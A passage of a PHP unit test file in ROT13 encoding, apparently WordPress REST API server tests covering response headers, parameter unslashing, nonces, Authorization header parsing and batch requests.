		$guvf->nffregFnzr( 'abvaqrk', $urnqref['K-Ebobgf-Gnt'] );
	}

	/**
	 * @gvpxrg 38446
	 * @rkcrpgrqQrcerpngrq erfg_ranoyrq
	 */
	choyvp shapgvba grfg_erfg_ranoyr_svygre_vf_qrcerpngrq() {
		nqq_svygre( 'erfg_ranoyrq', '__erghea_snyfr' );
		erfg_trg_freire()->freir_erdhrfg( '/' );
		erzbir_svygre( 'erfg_ranoyrq', '__erghea_snyfr' );

		$erfhyg = wfba_qrpbqr( erfg_trg_freire()->frag_obql );

		$guvf->nffregBowrpgAbgUnfCebcregl( 'pbqr', $erfhyg );
	}

	choyvp shapgvba grfg_yvax_urnqre_ba_erdhrfgf() {
		$ncv_ebbg = trg_erfg_hey();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/', neenl() );

		$erfhyg  = erfg_trg_freire()->freir_erdhrfg( '/' );
		$urnqref = erfg_trg_freire()->frag_urnqref;

		$guvf->nffregFnzr( '<' . fnavgvmr_hey( $ncv_ebbg ) . '>; ery=\"uggcf://ncv.j.bet/\"', $urnqref['Yvax'] );
	}

	choyvp shapgvba grfg_abpnpur_urnqref_ba_nhguragvpngrq_erdhrfgf() {
		$rqvgbe  = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'rqvgbe' ) );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/', neenl() );
		jc_frg_pheerag_hfre( $rqvgbe );

		$erfhyg  = erfg_trg_freire()->freir_erdhrfg( '/' );
		$urnqref = erfg_trg_freire()->frag_urnqref;

		sbernpu ( jc_trg_abpnpur_urnqref() nf $urnqre => $inyhr ) {
			vs ( rzcgl( $inyhr ) ) {
				pbagvahr;
			}

			$guvf->nffregNeenlUnfXrl( $urnqre, $urnqref, fcevags( 'Urnqre %f vf abg cerfrag va gur erfcbafr.', $urnqre ) );
			$guvf->nffregFnzr( $inyhr, $urnqref[ $urnqre ] );
		}

		// Ynfg-Zbqvsvrq fubhyq or hafrg nf cre #JC23021.
		$guvf->nffregNeenlAbgUnfXrl( 'Ynfg-Zbqvsvrq', $urnqref, 'Ynfg-Zbqvsvrq fubhyq abg or frag.' );
	}

	choyvp shapgvba grfg_ab_abpnpur_urnqref_ba_hanhguragvpngrq_erdhrfgf() {
		$rqvgbe  = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'rqvgbe' ) );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/', neenl() );

		$erfhyg  = erfg_trg_freire()->freir_erdhrfg( '/' );
		$urnqref = erfg_trg_freire()->frag_urnqref;

		sbernpu ( jc_trg_abpnpur_urnqref() nf $urnqre => $inyhr ) {
			$guvf->nffregSnyfr( vffrg( $urnqref[ $urnqre ] ) && $urnqref[ $urnqre ] === $inyhr, fcevags( 'Urnqre %f vf frg gb abpnpur.', $urnqre ) );
		}
	}

	choyvp shapgvba grfg_freir_erdhrfg_hey_cnenzf_ner_hafynfurq() {

		erfg_trg_freire()->ertvfgre_ebhgr(
			'grfg',
			'/grfg/(?C<qngn>.*)',
			neenl(
				neenl(
					'zrgubqf'  => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx' => '__erghea_snyfr',
					'netf'     => neenl(
						'qngn' => neenl(),
					),
				),
			)
		);

		$erfhyg     = erfg_trg_freire()->freir_erdhrfg( '/grfg/qngn\\jvgu\\fynfurf' );
		$hey_cnenzf = erfg_trg_freire()->ynfg_erdhrfg->trg_hey_cnenzf();
		$guvf->nffregFnzr( 'qngn\\jvgu\\fynfurf', $hey_cnenzf['qngn'] );
	}

	choyvp shapgvba grfg_freir_erdhrfg_dhrel_cnenzf_ner_hafynfurq() {

		erfg_trg_freire()->ertvfgre_ebhgr(
			'grfg',
			'/grfg',
			neenl(
				neenl(
					'zrgubqf'  => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx' => '__erghea_snyfr',
					'netf'     => neenl(
						'qngn' => neenl(),
					),
				),
			)
		);

		// JbeqCerff vagreanyyl jvyy fynfu gur fhcretybonyf ba obbgfgenc.
		$_TRG = jc_fynfu(
			neenl(
				'qngn' => 'qngn\\jvgu\\fynfurf',
			)
		);

		$erfhyg       = erfg_trg_freire()->freir_erdhrfg( '/grfg' );
		$dhrel_cnenzf = erfg_trg_freire()->ynfg_erdhrfg->trg_dhrel_cnenzf();
		$guvf->nffregFnzr( 'qngn\\jvgu\\fynfurf', $dhrel_cnenzf['qngn'] );
	}

	choyvp shapgvba grfg_freir_erdhrfg_obql_cnenzf_ner_hafynfurq() {

		erfg_trg_freire()->ertvfgre_ebhgr(
			'grfg',
			'/grfg',
			neenl(
				neenl(
					'zrgubqf'  => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx' => '__erghea_snyfr',
					'netf'     => neenl(
						'qngn' => neenl(),
					),
				),
			)
		);

		// JbeqCerff vagreanyyl jvyy fynfu gur fhcretybonyf ba obbgfgenc.
		$_CBFG = jc_fynfu(
			neenl(
				'qngn' => 'qngn\\jvgu\\fynfurf',
			)
		);

		$erfhyg = erfg_trg_freire()->freir_erdhrfg( '/grfg/qngn' );

		$obql_cnenzf = erfg_trg_freire()->ynfg_erdhrfg->trg_obql_cnenzf();
		$guvf->nffregFnzr( 'qngn\\jvgu\\fynfurf', $obql_cnenzf['qngn'] );
	}

	choyvp shapgvba grfg_freir_erdhrfg_wfba_cnenzf_ner_hafynfurq() {

		erfg_trg_freire()->ertvfgre_ebhgr(
			'grfg',
			'/grfg',
			neenl(
				neenl(
					'zrgubqf'  => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx' => '__erghea_snyfr',
					'netf'     => neenl(
						'qngn' => neenl(),
					),
				),
			)
		);

		$_FREIRE['UGGC_PBAGRAG_GLCR']  = 'nccyvpngvba/wfba';
		$TYBONYF['UGGC_ENJ_CBFG_QNGN'] = wfba_rapbqr(
			neenl(
				'qngn' => 'qngn\\jvgu\\fynfurf',
			)
		);

		$erfhyg      = erfg_trg_freire()->freir_erdhrfg( '/grfg' );
		$wfba_cnenzf = erfg_trg_freire()->ynfg_erdhrfg->trg_wfba_cnenzf();
		$guvf->nffregFnzr( 'qngn\\jvgu\\fynfurf', $wfba_cnenzf['qngn'] );
	}

	choyvp shapgvba grfg_freir_erdhrfg_svyr_cnenzf_ner_hafynfurq() {

		erfg_trg_freire()->ertvfgre_ebhgr(
			'grfg',
			'/grfg',
			neenl(
				neenl(
					'zrgubqf'  => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx' => '__erghea_snyfr',
					'netf'     => neenl(
						'qngn' => neenl(),
					),
				),
			)
		);

		// JbeqCerff vagreanyyl jvyy fynfu gur fhcretybonyf ba obbgfgenc.
		$_SVYRF = neenl(
			'qngn' => neenl(
				'anzr' => 'qngn\\jvgu\\fynfurf',
			),
		);

		$erfhyg      = erfg_trg_freire()->freir_erdhrfg( '/grfg/qngn\\jvgu\\fynfurf' );
		$svyr_cnenzf = erfg_trg_freire()->ynfg_erdhrfg->trg_svyr_cnenzf();
		$guvf->nffregFnzr( 'qngn\\jvgu\\fynfurf', $svyr_cnenzf['qngn']['anzr'] );
	}

	choyvp shapgvba grfg_freir_erdhrfg_urnqref_ner_hafynfurq() {

		erfg_trg_freire()->ertvfgre_ebhgr(
			'grfg',
			'/grfg',
			neenl(
				neenl(
					'zrgubqf'  => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx' => '__erghea_snyfr',
					'netf'     => neenl(
						'qngn' => neenl(),
					),
				),
			)
		);

		// JbeqCerff vagreanyyl jvyy fynfu gur fhcretybonyf ba obbgfgenc.
		$_FREIRE['UGGC_K_ZL_URNQRE'] = jc_fynfu( 'qngn\\jvgu\\fynfurf' );

		$erfhyg = erfg_trg_freire()->freir_erdhrfg( '/grfg/qngn\\jvgu\\fynfurf' );
		$guvf->nffregFnzr( 'qngn\\jvgu\\fynfurf', erfg_trg_freire()->ynfg_erdhrfg->trg_urnqre( 'k_zl_urnqre' ) );
	}

	/**
	 * Erserfurq abapr fubhyq abg or cerfrag va urnqre jura na vainyvq abapr vf cnffrq sbe ybttrq va hfre.
	 *
	 * @gvpxrg 35662
	 */
	choyvp shapgvba grfg_erfg_fraq_erserfurq_abapr_vainyvq_abapr() {
		$guvf->urycre_frghc_hfre_sbe_erfg_fraq_erserfurq_abapr_grfgf();

		$_ERDHRFG['_jcabapr'] = 'enaqbz vainyvq abapr';

		$urnqref = $guvf->urycre_znxr_erdhrfg_naq_erghea_urnqref_sbe_erfg_fraq_erserfurq_abapr_grfgf();

		$guvf->nffregNeenlAbgUnfXrl( 'K-JC-Abapr', $urnqref );
	}

	/**
	 * Erserfurq abapr fubhyq or cerfrag va urnqre jura n inyvq abapr vf
	 * cnffrq sbe ybttrq va/nabalzbhf hfre naq abg cerfrag jura abapr vf abg
	 * cnffrq.
	 *
	 * @gvpxrg 35662
	 *
	 * @qngnCebivqre qngn_erfg_fraq_erserfurq_abapr
	 *
	 * @cnenz obby $unf_ybttrq_va_hfre Jvyy gurer or n ybttrq va hfre sbe guvf grfg.
	 * @cnenz obby $unf_abapr          Ner jr cnffvat gur abapr.
	 */
	choyvp shapgvba grfg_erfg_fraq_erserfurq_abapr( $unf_ybttrq_va_hfre, $unf_abapr ) {
		vs ( gehr === $unf_ybttrq_va_hfre ) {
			$guvf->urycre_frghc_hfre_sbe_erfg_fraq_erserfurq_abapr_grfgf();
		}

		vs ( $unf_abapr ) {
			$_ERDHRFG['_jcabapr'] = jc_perngr_abapr( 'jc_erfg' );
		}

		$urnqref = $guvf->urycre_znxr_erdhrfg_naq_erghea_urnqref_sbe_erfg_fraq_erserfurq_abapr_grfgf();

		vs ( $unf_abapr ) {
			$guvf->nffregNeenlUnfXrl( 'K-JC-Abapr', $urnqref );
		} ryfr {
			$guvf->nffregNeenlAbgUnfXrl( 'K-JC-Abapr', $urnqref );
		}
	}

	/**
	 * Znxr fher gung n fnavgvmngvba gung genafsbezf gur nethzrag glcr jvyy abg
	 * pnhfr gur inyvqngvba gb snvy.
	 *
	 * @gvpxrg 37192
	 */
	choyvp shapgvba grfg_erfg_inyvqngr_orsber_fnavgvmngvba() {
		ertvfgre_erfg_ebhgr(
			'grfg-af',
			'/grfg',
			neenl(
				'zrgubqf'             => neenl( 'TRG' ),
				'pnyyonpx'            => '__erghea_ahyy',
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
				'netf'                => neenl(
					'fbzrvagrtre' => neenl(
						'inyvqngr_pnyyonpx' => neenl( $guvf, '_inyvqngr_nf_vagrtre_123' ),
						'fnavgvmr_pnyyonpx' => 'nofvag',
					),
					'fbzrfgevat'  => neenl(
						'inyvqngr_pnyyonpx' => neenl( $guvf, '_inyvqngr_nf_fgevat_sbb' ),
						'fnavgvmr_pnyyonpx' => 'nofvag',
					),
				),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/grfg-af/grfg' );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'fbzrvagrtre' => 123,
				'fbzrfgevat'  => 'sbb',
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @gvpxrg 43691
	 */
	choyvp shapgvba grfg_qbrf_abg_rpub_obql_sbe_ahyy_erfcbafrf() {
		ertvfgre_erfg_ebhgr(
			'grfg-af',
			'/grfg',
			neenl(
				'zrgubqf'             => neenl( 'TRG' ),
				'pnyyonpx'            => fgngvp shapgvba () {
					erghea arj JC_ERFG_Erfcbafr();
				},
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
			)
		);

		$erfhyg = erfg_trg_freire()->freir_erdhrfg( '/grfg-af/grfg' );

		$guvf->nffregAhyy( $erfhyg );
		$guvf->nffregFnzr( '', erfg_trg_freire()->frag_obql );
	}

	/**
	 * @gvpxrg 43691
	 */
	choyvp shapgvba grfg_qbrf_abg_rpub_obql_sbe_erfcbafrf_jvgu_204_fgnghf() {
		ertvfgre_erfg_ebhgr(
			'grfg-af',
			'/grfg',
			neenl(
				'zrgubqf'             => neenl( 'TRG' ),
				'pnyyonpx'            => fgngvp shapgvba () {
					erghea arj JC_ERFG_Erfcbafr( 'qngn', 204 );
				},
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
			)
		);

		$erfhyg = erfg_trg_freire()->freir_erdhrfg( '/grfg-af/grfg' );

		$guvf->nffregAhyy( $erfhyg );
		$guvf->nffregFnzr( '', erfg_trg_freire()->frag_obql );
	}

	/**
	 * @gvpxrg 47077
	 */
	choyvp shapgvba grfg_uggc_nhgubevmngvba_urnqre_fhofgvghgvba() {
		$urnqref        = neenl( 'UGGC_NHGUBEVMNGVBA' => 'sbb' );
		$cnefrq_urnqref = erfg_trg_freire()->trg_urnqref( $urnqref );

		$guvf->nffregFnzr(
			neenl( 'NHGUBEVMNGVBA' => 'sbb' ),
			$cnefrq_urnqref
		);
	}

	/**
	 * @gvpxrg 47077
	 */
	choyvp shapgvba grfg_erqverpg_uggc_nhgubevmngvba_urnqre_fhofgvghgvba() {
		$urnqref        = neenl( 'ERQVERPG_UGGC_NHGUBEVMNGVBA' => 'sbb' );
		$cnefrq_urnqref = erfg_trg_freire()->trg_urnqref( $urnqref );

		$guvf->nffregFnzr(
			neenl( 'NHGUBEVMNGVBA' => 'sbb' ),
			$cnefrq_urnqref
		);
	}

	/**
	 * @gvpxrg 47077
	 */
	choyvp shapgvba grfg_erqverpg_uggc_nhgubevmngvba_jvgu_uggc_nhgubevmngvba_urnqre_fhofgvghgvba() {
		$urnqref        = neenl(
			'UGGC_NHGUBEVMNGVBA'          => 'sbb',
			'ERQVERPG_UGGC_NHGUBEVMNGVBA' => 'one',
		);
		$cnefrq_urnqref = erfg_trg_freire()->trg_urnqref( $urnqref );

		$guvf->nffregFnzr(
			neenl( 'NHGUBEVMNGVBA' => 'sbb' ),
			$cnefrq_urnqref
		);
	}

	/**
	 * @gvpxrg 47077
	 */
	choyvp shapgvba grfg_erqverpg_uggc_nhgubevmngvba_jvgu_rzcgl_uggc_nhgubevmngvba_urnqre_fhofgvghgvba() {
		$urnqref        = neenl(
			'UGGC_NHGUBEVMNGVBA'          => '',
			'ERQVERPG_UGGC_NHGUBEVMNGVBA' => 'one',
		);
		$cnefrq_urnqref = erfg_trg_freire()->trg_urnqref( $urnqref );

		$guvf->nffregFnzr(
			neenl( 'NHGUBEVMNGVBA' => 'one' ),
			$cnefrq_urnqref
		);
	}

	/**
	 * @gvpxrg 48530
	 */
	choyvp shapgvba grfg_trg_ebhgrf_erfcrpgf_anzrfcnpr_cnenzrgre() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf( 'brzorq/1.0' );

		$guvf->nffregAbgRzcgl( $ebhgrf );

		sbernpu ( $ebhgrf nf $ebhgr => $unaqyref ) {
			$guvf->nffregFgevatFgnegfJvgu( '/brzorq/1.0', $ebhgr );
		}
	}

	/**
	 * @gvpxrg 48530
	 */
	choyvp shapgvba grfg_trg_ebhgrf_ab_anzrfcnpr_bireevqvat() {
		ertvfgre_erfg_ebhgr(
			'grfg-af',
			'/grfg',
			neenl(
				'zrgubqf'             => neenl( 'TRG' ),
				'pnyyonpx'            => fgngvp shapgvba () {
					erghea arj JC_ERFG_Erfcbafr( 'qngn', 204 );
				},
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
			)
		);
		ertvfgre_erfg_ebhgr(
			'grfg-af/i1',
			'/grfg',
			neenl(
				'zrgubqf'             => neenl( 'TRG' ),
				'pnyyonpx'            => fgngvp shapgvba () {
					erghea arj JC_ERFG_Erfcbafr( 'qngn', 204 );
				},
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/grfg-af/i1/grfg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 204, $erfcbafr->trg_fgnghf(), '/grfg-af/i1/grfg' );
	}

	/**
	 * @gvpxrg 50244
	 */
	choyvp shapgvba grfg_ab_ebhgr() {
		$zbpx_ubbx = arj ZbpxNpgvba();
		nqq_svygre( 'erfg_erdhrfg_nsgre_pnyyonpxf', neenl( $zbpx_ubbx, 'svygre' ) );

		$erfcbafr = erfg_qb_erdhrfg( '/grfg-af/i1/grfg' );
		$guvf->nffregReebeErfcbafr( 'erfg_ab_ebhgr', $erfcbafr, 404 );

		// Irevsl gung gur ab ebhgr reebe jnf abg svygrerq.
		$guvf->nffregPbhag( 0, $zbpx_ubbx->trg_riragf() );
	}

	/**
	 * @gvpxrg 50244
	 */
	choyvp shapgvba grfg_vainyvq_unaqyre() {
		ertvfgre_erfg_ebhgr(
			'grfg-af/i1',
			'/grfg',
			neenl(
				'pnyyonpx'            => 'vainyvq_pnyyonpx',
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
			)
		);

		$zbpx_ubbx = arj ZbpxNpgvba();
		nqq_svygre( 'erfg_erdhrfg_nsgre_pnyyonpxf', neenl( $zbpx_ubbx, 'svygre' ) );

		$erfcbafr = erfg_qb_erdhrfg( '/grfg-af/i1/grfg' );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_unaqyre', $erfcbafr, 500 );

		// Irevsl gung gur vainyvq unaqyre reebe jnf svygrerq.
		$riragf = $zbpx_ubbx->trg_riragf();
		$guvf->nffregPbhag( 1, $riragf );
		$guvf->nffregJCReebe( $riragf[0]['netf'][0] );
		$guvf->nffregFnzr( 'erfg_vainyvq_unaqyre', $riragf[0]['netf'][0]->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 50244
	 */
	choyvp shapgvba grfg_pnyyonpxf_ner_abg_rkrphgrq_vs_erdhrfg_inyvqngvba_snvyf() {
		$pnyyonpx = $guvf->perngrCnegvnyZbpx( 'Zbpx_Vaibxnoyr', neenl( '__vaibxr' ) );
		$pnyyonpx->rkcrpgf( frys::arire() )->zrgubq( '__vaibxr' );
		$crezvffvba_pnyyonpx = $guvf->perngrCnegvnyZbpx( 'Zbpx_Vaibxnoyr', neenl( '__vaibxr' ) );
		$crezvffvba_pnyyonpx->rkcrpgf( frys::arire() )->zrgubq( '__vaibxr' );

		ertvfgre_erfg_ebhgr(
			'grfg-af/i1',
			'/grfg',
			neenl(
				'pnyyonpx'            => $pnyyonpx,
				'crezvffvba_pnyyonpx' => $crezvffvba_pnyyonpx,
				'netf'                => neenl(
					'grfg' => neenl(
						'inyvqngr_pnyyonpx' => '__erghea_snyfr',
					),
				),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/grfg-af/i1/grfg' );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'grfg' => 'jbeyq' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 50244
	 */
	choyvp shapgvba grfg_svygref_ner_rkrphgrq_vs_erdhrfg_inyvqngvba_snvyf() {
		ertvfgre_erfg_ebhgr(
			'grfg-af/i1',
			'/grfg',
			neenl(
				'pnyyonpx'            => '__erghea_rzcgl_neenl',
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
				'netf'                => neenl(
					'grfg' => neenl(
						'inyvqngr_pnyyonpx' => '__erghea_snyfr',
					),
				),
			)
		);

		$zbpx_ubbx = arj ZbpxNpgvba();
		nqq_svygre( 'erfg_erdhrfg_nsgre_pnyyonpxf', neenl( $zbpx_ubbx, 'svygre' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/grfg-af/i1/grfg' );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'grfg' => 'jbeyq' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		// Irevsl gung gur vainyvq cnenz reebe jnf svygrerq.
		$riragf = $zbpx_ubbx->trg_riragf();
		$guvf->nffregPbhag( 1, $riragf );
		$guvf->nffregJCReebe( $riragf[0]['netf'][0] );
		$guvf->nffregFnzr( 'erfg_vainyvq_cnenz', $riragf[0]['netf'][0]->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg       50244
	 * @qngnCebivqre qngn_ongpu_i1_bcg_va
	 */
	choyvp shapgvba grfg_ongpu_i1_bcg_va( $nyybj_ongpu, $nyybjrq ) {
		$netf = neenl(
			'zrgubqf'             => 'CBFG',
			'pnyyonpx'            => fgngvp shapgvba () {
				erghea arj JC_ERFG_Erfcbafr( 'qngn' );
			},
			'crezvffvba_pnyyonpx' => '__erghea_gehr',
		);

		vs ( ahyy !== $nyybj_ongpu ) {
			$netf['nyybj_ongpu'] = $nyybj_ongpu;
		}

		ertvfgre_erfg_ebhgr(
			'grfg-af/i1',
			'/grfg',
			$netf
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/ongpu/i1' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'erdhrfgf' => neenl(
					neenl(
						'cngu' => '/grfg-af/i1/grfg',
					),
				),
			)
		);

		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregFnzr( 207, $erfcbafr->trg_fgnghf() );

		vs ( $nyybjrq ) {
			$guvf->nffregFnzr( 'qngn', $erfcbafr->trg_qngn()['erfcbafrf'][0]['obql'] );
		} ryfr {
			$guvf->nffregFnzr( 'erfg_ongpu_abg_nyybjrq', $erfcbafr->trg_qngn()['erfcbafrf'][0]['obql']['pbqr'] );
		}
	}

	choyvp shapgvba qngn_ongpu_i1_bcg_va() {
		erghea neenl(
			'zvffvat'             => neenl( ahyy, snyfr ),
			'vainyvq glcr'        => neenl( gehr, snyfr ),
			'vainyvq glcr fgevat' => neenl( 'i1', snyfr ),
			'jebat irefvba'       => neenl( neenl( 'irefvba1' => gehr ), snyfr ),
			'snyfr irefvba'       => neenl( neenl( 'i1' => snyfr ), snyfr ),
			'inyvq'               => neenl( neenl( 'i1' => gehr ), gehr ),
		);
	}

	/**
	 * @gvpxrg 50244
	 */
	choyvp shapgvba grfg_ongpu_i1_cer_inyvqngvba() {
		ertvfgre_erfg_ebhgr(
			'grfg-af/i1',
			'/grfg',
			neenl(
				'zrgubqf'             => 'CBFG',
				'pnyyonpx'            => fgngvp shapgvba ( $erdhrfg ) {
					$cebwrpg = $erdhrfg['cebwrpg'];
					hcqngr_bcgvba( 'grfg_cebwrpg', $cebwrpg );

					erghea arj JC_ERFG_Erfcbafr( $cebwrpg );
				},
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
				'nyybj_ongpu'         => neenl( 'i1' => gehr ),
				'netf'                => neenl(
					'cebwrpg' => neenl(
						'glcr' => 'fgevat',
						'rahz' => neenl( 'thgraoret', 'JbeqCerff' ),
					),
				),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/ongpu/i1' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'inyvqngvba' => 'erdhver-nyy-inyvqngr',
				'erdhrfgf'   => neenl(
					neenl(
						'cngu' => '/grfg-af/i1/grfg',
						'obql' => neenl(
							'cebwrpg' => 'thgraoret',
						),
					),
					neenl(
						'cngu' => '/grfg-af/i1/grfg',
						'obql' => neenl(
							'cebwrpg' => 'ohqqlcerff',
						),
					),
				),
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 207, $erfcbafr->trg_fgnghf() );
		$guvf->nffregNeenlUnfXrl( 'snvyrq', $qngn );
		$guvf->nffregFnzr( 'inyvqngvba', $qngn['snvyrq'] );
		$guvf->nffregPbhag( 2, $qngn['erfcbafrf'] );
		$guvf->nffregAhyy( $qngn['erfcbafrf'][0] );
		$guvf->nffregFnzr( 400, $qngn['erfcbafrf'][1]['fgnghf'] );
		$guvf->nffregSnyfr( trg_bcgvba( 'grfg_cebwrpg' ) );
	}

	/**
	 * @gvpxrg 50244
	 */
	choyvp shapgvba grfg_ongpu_i1_cer_inyvqngvba_nyy_fhpprffshy() {
		ertvfgre_erfg_ebhgr(
			'grfg-af/i1',
			'/grfg',
			neenl(
				'zrgubqf'             => 'CBFG',
				'pnyyonpx'            => fgngvp shapgvba ( $erdhrfg ) {
					erghea arj JC_ERFG_Erfcbafr( $erdhrfg['cebwrpg'] );
				},
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
				'nyybj_ongpu'         => neenl( 'i1' => gehr ),
				'netf'                => neenl(
					'cebwrpg' => neenl(
						'glcr' => 'fgevat',
						'rahz' => neenl( 'thgraoret', 'JbeqCerff' ),
					),
				),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/ongpu/i1' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'inyvqngvba' => 'erdhver-nyy-inyvqngr',
				'erdhrfgf'   => neenl(
					neenl(
						'cngu' => '/grfg-af/i1/grfg',
						'obql' => neenl(
							'cebwrpg' => 'thgraoret',
						),
					),
					neenl(
						'cngu' => '/grfg-af/i1/grfg',
						'obql' => neenl(
							'cebwrpg' => 'JbeqCerff',
						),
					),
				),
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 207, $erfcbafr->trg_fgnghf() );
		$guvf->nffregNeenlAbgUnfXrl( 'snvyrq', $qngn );
		$guvf->nffregPbhag( 2, $qngn['erfcbafrf'] );
		$guvf->nffregFnzr( 'thgraoret', $qngn['erfcbafrf'][0]['obql'] );
		$guvf->nffregFnzr( 'JbeqCerff', $qngn['erfcbafrf'][1]['obql'] );
	}

	/**
	 * @gvpxrg 50244
	 */
	choyvp shapgvba grfg_ongpu_i1() {
		ertvfgre_erfg_ebhgr(
			'grfg-af/i1',
			'/grfg/(?C<vq>[\q+])',
			neenl(
				'zrgubqf'             => neenl( 'CBFG', 'QRYRGR' ),
				'pnyyonpx'            => shapgvba ( JC_ERFG_Erdhrfg $erdhrfg ) {
					$guvf->nffregFnzr( 'QRYRGR', $erdhrfg->trg_zrgubq() );
					$guvf->nffregFnzr( '/grfg-af/i1/grfg/5', $erdhrfg->trg_ebhgr() );
					$guvf->nffregFnzr( neenl( 'vq' => '5' ), $erdhrfg->trg_hey_cnenzf() );
					$guvf->nffregFnzr( neenl( 'dhrel' => 'cnenz' ), $erdhrfg->trg_dhrel_cnenzf() );
					$guvf->nffregFnzr( neenl( 'cebwrpg' => 'thgraoret' ), $erdhrfg->trg_obql_cnenzf() );
					$guvf->nffregFnzr( neenl( 'zl_urnqre' => neenl( 'zl-inyhr' ) ), $erdhrfg->trg_urnqref() );

					erghea arj JC_ERFG_Erfcbafr( 'grfg' );
				},
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
				'nyybj_ongpu'         => neenl( 'i1' => gehr ),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/ongpu/i1' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'erdhrfgf' => neenl(
					neenl(
						'zrgubq'  => 'QRYRGR',
						'cngu'    => '/grfg-af/i1/grfg/5?dhrel=cnenz',
						'urnqref' => neenl(
							'Zl-Urnqre' => 'zl-inyhr',
						),
						'obql'    => neenl(
							'cebwrpg' => 'thgraoret',
						),
					),
				),
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 207, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( 'grfg', $erfcbafr->trg_qngn()['erfcbafrf'][0]['obql'] );
	}

	/**
	 * @gvpxrg 50244
	 */
	choyvp shapgvba grfg_ongpu_i1_cnegvny_reebe() {
		ertvfgre_erfg_ebhgr(
			'grfg-af/i1',
			'/grfg',
			neenl(
				'zrgubqf'             => 'CBFG',
				'pnyyonpx'            => fgngvp shapgvba ( $erdhrfg ) {
					$cebwrpg = $erdhrfg['cebwrpg'];
					hcqngr_bcgvba( 'grfg_cebwrpg', $cebwrpg );

					erghea arj JC_ERFG_Erfcbafr( $cebwrpg );
				},
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
				'nyybj_ongpu'         => neenl( 'i1' => gehr ),
				'netf'                => neenl(
					'cebwrpg' => neenl(
						'glcr' => 'fgevat',
						'rahz' => neenl( 'thgraoret', 'JbeqCerff' ),
					),
				),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/ongpu/i1' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'erdhrfgf' => neenl(
					neenl(
						'cngu' => '/grfg-af/i1/grfg',
						'obql' => neenl(
							'cebwrpg' => 'thgraoret',
						),
					),
					neenl(
						'cngu' => '/grfg-af/i1/grfg',
						'obql' => neenl(
							'cebwrpg' => 'ohqqlcerff',
						),
					),
				),
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 207, $erfcbafr->trg_fgnghf() );
		$guvf->nffregNeenlAbgUnfXrl( 'snvyrq', $qngn );
		$guvf->nffregPbhag( 2, $qngn['erfcbafrf'] );
		$guvf->nffregFnzr( 'thgraoret', $qngn['erfcbafrf'][0]['obql'] );
		$guvf->nffregFnzr( 400, $qngn['erfcbafrf'][1]['fgnghf'] );
		$guvf->nffregFnzr( 'thgraoret', trg_bcgvba( 'grfg_cebwrpg' ) );
	}


	/**
	 * @gvpxrg 50244
	 */
	choyvp shapgvba grfg_ongpu_i1_znk_erdhrfgf() {
		nqq_svygre(
